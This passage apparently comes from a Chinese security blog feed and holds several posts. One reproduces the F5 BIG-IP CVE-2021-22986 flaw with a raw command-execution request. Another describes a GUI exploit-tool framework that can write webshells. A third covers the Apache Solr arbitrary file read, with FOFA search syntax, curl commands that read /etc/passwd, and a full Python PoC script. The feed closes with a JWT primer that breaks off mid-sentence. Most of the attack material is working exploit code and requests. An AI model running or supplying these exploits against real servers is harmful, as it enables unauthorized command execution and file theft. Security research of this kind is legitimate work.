使用POC攻击</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apl">POST &#x2F;mgmt&#x2F;tm&#x2F;util&#x2F;bash HTTP&#x2F;1.1<br>Content-Type: application&#x2F;json<br>User-Agent: Mozilla&#x2F;5.0 (compatible; Baiduspider&#x2F;2.0; +http:&#x2F;&#x2F;www.baidu.com&#x2F;search&#x2F;spider.html)<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q&#x3D;0.9<br>Connection: close<br>Authorization: Basic YWRtaW46QVNhc1M&#x3D;<br>X-F5-Auth-Token: <br>Host: 192.168.1.191<br>Content-Length: 39<br><br>&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c id&quot;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210404144015.png" alt="image-20210404111524871"></p><h2 id="0x04-利用工具编写"><a href="#0x04-利用工具编写" class="headerlink" title="0x04 利用工具编写"></a>0x04 利用工具编写</h2><p>直接使用上次的<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483987&idx=1&sn=2ee31ccbf8588c23e4184fcd3ab251f8&chksm=c2829b4af5f5125c563e437263eec4ebac08f32f2ace3e4bed9f5c8e562bac5299260b847c27#rd">图形化漏洞利用工具</a>编写</p><blockquote><p>图形化漏洞利用工具已更新</p><p>项目地址：<a href="https://github.com/yhy0/ExpDemo-JavaFX">https://github.com/yhy0/ExpDemo-JavaFX</a></p><p>V1.1 </p><p>​    参考冰蝎的代理，添加代理设置，方便走burp调试</p><p>​    优化批量检查逻辑，使用接口，这样每次添加新的漏洞利用时，就不需要修改批量检查的逻辑。</p></blockquote><p>在<code>src/main/java/com/yhy/core</code>下新建<code>CVE_2021_22986</code>类，实现<code>ExploitInterface</code>接口，并实现里面的函数，具体填充，直接将项目中的示例<code>CVE_2020_14882</code> 的内容复制过去，修改一下内容，填充payload即可</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210404144011.png" alt="image-20210404113814410"></p><p>写完后，进入<code>src/main/java/com/yhy/core/Constants.java</code> 和 <code>src/main/java/com/yhy/tools/Tools.java</code>修改</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210404144002.png" alt="image-20210404132413838"></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210404144006.png" alt="image-20210404132702066"></p><p>运行即可。</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210404143957.gif" alt="CVE-2021-22986"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>图形化漏洞利用Demo-JavaFX版</title>
    <link href="/2021/03/23/%E5%9B%BE%E5%BD%A2%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8Demo-JavaFX%E7%89%88/"/>
    <url>/2021/03/23/%E5%9B%BE%E5%BD%A2%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8Demo-JavaFX%E7%89%88/</url>
    
    <content type="html"><![CDATA[<blockquote><p>  山高水长,天涯未远,江湖再见</p></blockquote><h2 id="0x01-这是个嘛？"><a href="#0x01-这是个嘛？" class="headerlink" title="0x01 这是个嘛？"></a>0x01 这是个嘛？</h2><p>这是一个构建图形化漏洞利用的一个项目，已经写好架子，只需要往里填充exp即可，帮助安全人员快速构建一个图形化的、跨平台的漏洞利用工具。</p><p>虽然有很多优秀的命令行利用工具，但我觉得还是带界面的方便。</p><p>使用本项目，你不需要懂太多Java语言，只需要了解基本的语法，参考自带的EXP例子，即可快速开发一款<strong>属于你自己</strong>的漏洞利用工具。</p><h2 id="0x02-Demo"><a href="#0x02-Demo" class="headerlink" title="0x02 Demo"></a>0x02 Demo</h2><p>废话不多说，先上效果图，自带CVE-2020-14882 Weblogic远程代码执行漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210327184310.gif" alt="JavaFX"></p><h2 id="0x03-编写属于你的图像化漏洞利用工具"><a href="#0x03-编写属于你的图像化漏洞利用工具" class="headerlink" title="0x03 编写属于你的图像化漏洞利用工具"></a>0x03 编写属于你的图像化漏洞利用工具</h2><h4 id="3-1-项目结构"><a href="#3-1-项目结构" class="headerlink" title="3.1 项目结构"></a>3.1 项目结构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs apl">.<br>├── ExpDemo-JavaFX.iml<br>├── pom.xmlmaven工程的基本文件<br>└── src<br>    └── main<br>        ├── deploy<br>        │   └── ExpDemo-JavaFX-1.0.icns<br>        ├── java<br>        │   └── com<br>        │       └── yhy<br>        │           ├── Controller.java 控制JavaFX图形化界面的各种显示、事件等，核心代码<br>        │           ├── Main.java     JavaFX 应用程序的入口<br>        │           ├── core    核心代码文件夹<br>        │           │   ├── CVE_2020_14882.java exp编写示例<br>        │           │   ├── Constants.java  一些常量信息<br>        │           │   ├── ExploitInterface.java exp 编写要实现的接口<br>        │           │   ├── Job.java批量检查的线程池<br>        │           │   └── VulInfo.java    映射批量检查界面中的表格，信息基本类<br>        │           └── tools工具文件夹<br>        │               ├── HttpTool.java     HTTP 请求封装<br>        │               ├── MyCERT.java    HTTPS 请求证书设置<br>        │               └── Tools.java    一些处理函数<br>        └── resources资源文件夹<br>            ├── sample.fxml avaFX图形化界面描述文件<br>            ├── sec.png<br>            └── weixin.jpg<br></code></pre></td></tr></table></figure><h4 id="3-2-编写EXP"><a href="#3-2-编写EXP" class="headerlink" title="3.2 编写EXP"></a>3.2 编写EXP</h4><p>编写EXP时，要使用 <code>implements</code>实现<code>ExploitInterface</code>接口，实现接口中的几个方法</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210327194809.png" alt="image-20210327190517731"></p><ul><li>  checkVUL        使用poc 检查是否漏洞</li><li>  exeCMD          使用exp执行命令</li><li>  uploadFile        使用命令执行 写webshell，上传文件</li><li>  getWebPath     获取网站的web目录，供上传文件使用</li><li>  isVul                是否存在漏洞，检查时会根据结构自动赋值，供后续调用</li></ul><p>EXP具体编写请参考 <code>src/main/java/com/yhy/core/CVE_2020_14882.java</code> 示例</p><p>当编写完EXP后，转到 <code>src/main/java/com/yhy/core/Constants.java</code> 文件，修改<code>CVES</code> 变量，即图像化界面中可供选择的漏洞列表</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210327194816.png" alt="image-20210327191129699"></p><p>之后进入<code>src/main/java/com/yhy/Controller.java</code> 和 <code>com/yhy/tools/Tools.java</code> 文件编写逻辑</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210327210741.png" alt="Snipaste_2021-03-27_21-04-14"></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210327210756.png" alt="111111111111111"></p><p>编写完后，可以直接执行<code>Main</code>类, 查看是否正常运行。</p><h4 id="3-3-部署，发布"><a href="#3-3-部署，发布" class="headerlink" title="3.3 部署，发布"></a>3.3 部署，发布</h4><p>当一切编写完成，bug修复完毕，在项目根目录下执行 <code>mvn jfx:jar</code> 即可生成 jar文件。</p><p>对方没有Java环境，不想安装怎么办？</p><p>使用<code>mvn jfx:native</code> 命令生产对应平台的文件，比如Mac 下，执行命令<code>mvn jfx:native</code> 命令就会在 <strong>target/jfx/native</strong> 目录下生成打包后应用，带可执行文件，带 JRE 运行环境。</p><p> <code>mvn clean</code> 用于清除生成的文件。</p><h2 id="0x04-界面修改"><a href="#0x04-界面修改" class="headerlink" title="0x04 界面修改"></a>0x04 界面修改</h2><p>对界面不满意，或者想添加其他功能</p><p>安装 JavaFx Scene Builder</p><p><a href="https://www.oracle.com/java/technologies/javafxscenebuilder-1x-archive-downloads.html">https://www.oracle.com/java/technologies/javafxscenebuilder-1x-archive-downloads.html</a></p><p>安装完，在IDEA中右键打开(设置好JavaFx Scene Builder的路径)</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210327194824.png" alt="image-20210327192030204"></p><p>打开后</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210327194835.png" alt="image-20210327192230881"></p><p>想添加什么控件，直接从Scene Builder的左边控件栏中拖拽一个到界面设计区域，然后只需要关心右侧栏第三个<code>Code</code>的<code>fx:id</code> 和<code>On Action</code> </p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210327194840.png" alt="image-20210327192402177"></p><p>比如想添加一个 输入框，搜索框查询，然后拖一个 <code>TextField</code> 控件到设计区</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210327194844.png" alt="image-20210327192547983"></p><p>为这个 <code>TextField</code> 设置一个<code>fx:id</code> ，然后<code>Ctrl+s</code>保存,  <code>sample.fxml</code> 会做出相应的更改，不需要关心</p><p>之后到<code>src/main/java/com/yhy/Controller.java</code> 文件编写逻辑</p><ol><li><p>使用<code>@FXML</code>注解，声明变量</p><p> <img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210327194848.png" alt="image-20210327192937964"></p></li><li><p>在函数中使用变量</p><p> 使用<code>this.cmd.getText() </code>获取输入的值</p><p> 使用<code>this.cmd.setText() </code>设置值</p><p> <img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210327194852.png" alt="image-20210327193148639"></p><p> 其他控件使用，请参考<code>src/main/java/com/yhy/Controller.java</code> ，或者自行学习JavaFX。</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>GitHub工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>GitHub工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞复现-Apache Solr 任意文件读取漏洞</title>
    <link href="/2021/03/18/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/03/18/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<blockquote><p>  这周在hw，水一篇文章，记录一下漏洞利用，当一个合格的脚本小子</p></blockquote><h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>由于Apache Solr默认安装时未开启身份验证，导致未经身份验证的攻击者可利用Config API打开requestDispatcher.requestParsers.enableRemoteStreaming开关，从而使攻击者可以在未授权的情况下获取目标服务器敏感文件。</p><blockquote><p>  听说报给官方后，官方拒绝修复，认为这不是一个漏洞，比一些src还离谱，人家起码会给个内部已知:eyes:</p></blockquote><h2 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h2><center>Apache Solr <= 8.8.1（全版本）</center> <h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>fofa 语法：<code>app=&quot;Solr&quot;</code></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210318204223.png" alt="image-20210318195353083"></p><h4 id="3-1-获取-core-name，拼接url"><a href="#3-1-获取-core-name，拼接url" class="headerlink" title="3.1 获取 core name，拼接url"></a>3.1 获取 core name，拼接url</h4><p><code>http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&amp;wt=json</code></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210318204233.png" alt="image-20210318195317802"></p><p>Core name为：<code>arabnews</code>，那么使用的url 为 <code>http://xxx.xxx.xxx.xxx/solr/arabnews/config</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -d <span class="hljs-string">&#x27;&#123;  &quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#x27;</span> http://xxx.xxx.xxx.xxx/solr/arabnews/config -H <span class="hljs-string">&#x27;Content-type:application/json&#x27;</span><br></code></pre></td></tr></table></figure><p>继续使用 core name 拼接 <code>http://xxx.xxx.xxx.xxx/solr/arabnews/debug/dump?param=ContentStreams</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://xxx.xxx.xxx.xxx/solr/arabnews/debug/dump?param=ContentStreams&quot;</span> -F <span class="hljs-string">&quot;stream.url=file:///etc/passwd&quot;</span><br></code></pre></td></tr></table></figure><h4 id="3-2-攻击"><a href="#3-2-攻击" class="headerlink" title="3.2 攻击"></a>3.2 攻击</h4><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210318204248.png" alt="image-20210318200603145"></p><h2 id="0x04-漏洞POC"><a href="#0x04-漏洞POC" class="headerlink" title="0x04  漏洞POC"></a>0x04  漏洞POC</h2><p>PeiQi文库的大佬已经写好了，我改了一点小毛病，读取完返回的值不一定是json，我复现的时候就遇到了这个问题，将json处理删掉了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-comment"># @Author : PeiQi</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> requests.packages.urllib3.exceptions <span class="hljs-keyword">import</span> InsecureRequestWarning<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">title</span>():</span><br>    print(<span class="hljs-string">&#x27;+------------------------------------------&#x27;</span>)<br>    print(<span class="hljs-string">&#x27;+  \033[34mPOC_Des: http://wiki.peiqi.tech           \033[0m&#x27;</span>)<br>    print(<span class="hljs-string">&#x27;+  \033[34mGithub : https://github.com/PeiQi0        \033[0m&#x27;</span>)<br>    print(<span class="hljs-string">&#x27;+  \033[34m公众号  : PeiQi文库                        \033[0m&#x27;</span>)<br>    print(<span class="hljs-string">&#x27;+  \033[34mVersion: Apache Solr &lt; 8.2.0            \033[0m&#x27;</span>)<br>    print(<span class="hljs-string">&#x27;+  \033[36m使用格式: python3 CVE-2019-0193.py       \033[0m&#x27;</span>)<br>    print(<span class="hljs-string">&#x27;+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:8983  \033[0m&#x27;</span>)<br>    print(<span class="hljs-string">&#x27;+  \033[36mFile   &gt;&gt;&gt; 文件名称或目录                  \033[0m&#x27;</span>)<br>    print(<span class="hljs-string">&#x27;+------------------------------------------&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">POC_1</span>(<span class="hljs-params">target_url</span>):</span><br>    core_url = target_url + <span class="hljs-string">&quot;/solr/admin/cores?indexInfo=false&amp;wt=json&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        response = requests.request(<span class="hljs-string">&quot;GET&quot;</span>, url=core_url, timeout=<span class="hljs-number">10</span>)<br>        core_name = <span class="hljs-built_in">list</span>(json.loads(response.text)[<span class="hljs-string">&quot;status&quot;</span>])[<span class="hljs-number">0</span>]<br>        print(<span class="hljs-string">&quot;\033[32m[o] 成功获得core_name,Url为：&quot;</span> + target_url + <span class="hljs-string">&quot;/solr/&quot;</span> + core_name + <span class="hljs-string">&quot;/config\033[0m&quot;</span>)<br>        <span class="hljs-keyword">return</span> core_name<br>    <span class="hljs-keyword">except</span>:<br>        print(<span class="hljs-string">&quot;\033[31m[x] 目标Url漏洞利用失败\033[0m&quot;</span>)<br>        sys.exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">POC_2</span>(<span class="hljs-params">target_url, core_name</span>):</span><br>    vuln_url = target_url + <span class="hljs-string">&quot;/solr/&quot;</span> + core_name + <span class="hljs-string">&quot;/config&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;Content-type&quot;</span>:<span class="hljs-string">&quot;application/json&quot;</span><br>    &#125;<br>    data = <span class="hljs-string">&#x27;&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#x27;</span><br>    <span class="hljs-keyword">try</span>:<br>        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br>        response = requests.post(url=vuln_url, data=data, headers=headers, verify=<span class="hljs-literal">False</span>, timeout=<span class="hljs-number">5</span>)<br>        print(<span class="hljs-string">&quot;\033[36m[o] 正在准备文件读取...... \033[0m&quot;</span>.<span class="hljs-built_in">format</span>(target_url))<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;responseHeader&quot;</span> <span class="hljs-keyword">in</span> response.text <span class="hljs-keyword">and</span> response.status_code == <span class="hljs-number">200</span>:<br>            print(<span class="hljs-string">&quot;\033[32m[o] 目标 &#123;&#125; 可能存在漏洞 \033[0m&quot;</span>.<span class="hljs-built_in">format</span>(target_url))<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">&quot;\033[31m[x] 目标 &#123;&#125; 不存在漏洞\033[0m&quot;</span>.<span class="hljs-built_in">format</span>(target_url))<br>            sys.exit(<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        print(<span class="hljs-string">&quot;\033[31m[x] 请求失败 \033[0m&quot;</span>, e)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">POC_3</span>(<span class="hljs-params">target_url, core_name, File_name</span>):</span><br>    vuln_url = target_url + <span class="hljs-string">&quot;/solr/&#123;&#125;/debug/dump?param=ContentStreams&quot;</span>.<span class="hljs-built_in">format</span>(core_name)<br>    headers = &#123;<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>    &#125;<br>    data = <span class="hljs-string">&#x27;stream.url=file://&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(File_name)<br>    <span class="hljs-keyword">try</span>:<br>        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br>        response = requests.post(url=vuln_url, data=data, headers=headers, verify=<span class="hljs-literal">False</span>, timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;No such file or directory&quot;</span> <span class="hljs-keyword">in</span> response.text:    <br>            print(<span class="hljs-string">&quot;\033[31m[x] 读取&#123;&#125;失败 \033[0m&quot;</span>.<span class="hljs-built_in">format</span>(File_name))<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">&quot;\033[36m[o] 响应为:\n&#123;&#125; \033[0m&quot;</span>.<span class="hljs-built_in">format</span>(response.text))<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        print(<span class="hljs-string">&quot;\033[31m[x] 请求失败 \033[0m&quot;</span>, e)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    title()<br>    target_url = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;</span>))<br>    core_name = POC_1(target_url)<br>    POC_2(target_url, core_name)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        File_name = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\033[35mFile &gt;&gt;&gt; \033[0m&quot;</span>))<br>        POC_3(target_url, core_name, File_name)<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210318204258.png" alt="image-20210318204216768"></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247484117&idx=1&sn=2fdab8cbe4b873f8dd8abb35d935d186&chksm=cecfaa8cf9b8239acbc83c363af62c41602cb167c485acc23a9850980044487585e6c408f632&scene=132#wechat_redirect">Apache Solr 任意文件读取漏洞 1Day</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初探JWT</title>
    <link href="/2021/03/05/%E5%88%9D%E6%8E%A2JWT/"/>
    <url>/2021/03/05/%E5%88%9D%E6%8E%A2JWT/</url>
    
    <content type="html"><![CDATA[<blockquote><p>  当你迷茫时，就去学习新东西</p></blockquote><h1 id="初探JWT"><a href="#初探JWT" class="headerlink" title="初探JWT"></a>初探JWT</h1><h2 id="0x01-什么是JWT"><a href="#0x01-什么是JWT" class="headerlink" title="0x01 什么是JWT"></a>0x01 什么是JWT</h2><p><strong>JWT</strong> 全称为 <strong>JSON Web Tokens</strong> ，是为了在网络应用环境间传递声明而执行的一种基于JSON 的开放标准 (RFC 7519)，该 token 被设计为紧凑且安全的，它的两大使用场景是：认证和数据交换，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p><h2 id="0x02-JWT组成"><a href="#0x02-JWT组成" class="headerlink" title="0x02 JWT组成"></a>0x02 JWT组成</h2><p>一个JWT实际上就是一个字符串，它由三部分组成，<strong>头部</strong>、<strong>载荷</strong>与<strong>签名</strong>，中间用 <code>.</code> 分隔，例如：<code>xxxxx.yyyyy.zzzzz</code></p><h4 id="2-1-头部-header"><a href="#2-1-头部-header" class="headerlink" title="2.1 头部(header)"></a>2.1 头部(header)</h4><p>头部通常由两部分组成：令牌的类型（即 JWT）和正在使用的签名算法（如 HMAC SHA256 或 RSA.）。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;alg&quot;</span>: <span class="hljs-string">&quot;HS256&quot;</span>,<br>  <span class="hljs-attr">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>然后用 <code>Base64url</code> 编码得到头部，即 <code>xxxxx</code>。</p><blockquote><p>  <strong>Base64URL算法</strong></p><p>  该算法和常见Base64算法类似，稍有差别。Base64中用的三个字符是”+”，”/“和”=”，由于在URL中有特殊含义，因此Base64URL中对他们做了替换：”=”去掉，”+”用”-“替换，”/“用”_”替换，这就是Base64URL算法。</p></blockquote><h4 id="2-2-载荷-Payload"><a href="#2-2-载荷-Payload" class="headerlink" title="2.2 载荷(Payload)"></a>2.2 载荷(Payload)</h4><p>载荷中放置了 <code>token</code> 的一些基本信息，以帮助接收它的服务器来理解这个 <code>token</code>。同时还可以包含一些自定义的信息。</p><p>JWT 官方规定了7个，也就是预定义（Registered claims）的载荷，供选用。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;sub&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>  <span class="hljs-attr">&quot;iss&quot;</span>: <span class="hljs-string">&quot;http://localhost:8000/auth/login&quot;</span>,<br>  <span class="hljs-attr">&quot;iat&quot;</span>: <span class="hljs-number">1451888119</span>,<br>  <span class="hljs-attr">&quot;exp&quot;</span>: <span class="hljs-number">1454516119</span>,<br>  <span class="hljs-attr">&quot;nbf&quot;</span>: <span class="hljs-number">1451888119</span>,<br>  <span class="hljs-attr">&quot;jti&quot;</span>: <span class="hljs-string">&quot;37c107e4609ddbcc9c096ea5ee76c667&quot;</span>, <br>  <span class="hljs-attr">&quot;aud&quot;</span>: <span class="hljs-string">&quot;dev&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>  sub (subject)：主题</p><p>  iss (issuer)：签发人</p><p>  iat (Issued At)：签发时间</p><p>  exp (expiration time)：过期时间</p><p>  nbf (Not Before)：生效时间</p><p>  jti (JWT ID)：编号</p><p>  aud (audience)：受众</p></blockquote><p>除了以上字段之外，你完全可以添加自己想要的任何字段，这里还是提醒一下，由于JWT的标准，信息是不加密的，所以一些敏感信息最好不要添加到json里面</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;Name&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<br>    <span class="hljs-attr">&quot;Age&quot;</span>:<span class="hljs-number">18</span><br>&#125;<br></code></pre></td></tr></table></figure><p>将上面的 <code>json</code> 进行 <code>Base64url</code> 编码得到载荷，即 <code>yyyyy</code>。</p><h4 id="2-3-签名-Signature"><a href="#2-3-签名-Signature" class="headerlink" title="2.3 签名(Signature)"></a>2.3 签名(Signature)</h4><p>签名时需要用到编码过的header、编码过的payload、一个秘钥（这个秘钥只有服务端知道），签名算法是header中指定的那个，如果以 <code>HMACSHA256</code> 加密，就如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json">HMACSHA256(<br>  base64UrlEncode(header) + &quot;.&quot; +<br>  base64UrlEncode(payload),<br>  secret)<br></code></pre></td></tr></table></figure><p>加密后再进行 <code>Base64url</code> 编码最后得到的字符串就是 <code>token</code> 的第三部分 <code>zzzzz</code>。</p><p>组合便可以得到 <code>token：xxxxx.yyyyy.zzzzz</code>。</p><p>签名的作用：保证 JWT 没有被篡改过，原理如下：</p><blockquote><p>  HMAC 算法是不可逆算法，类似 MD5 和 hash ，但多一个密钥，密钥（即上面的 secret）由服务端持有，客户端把 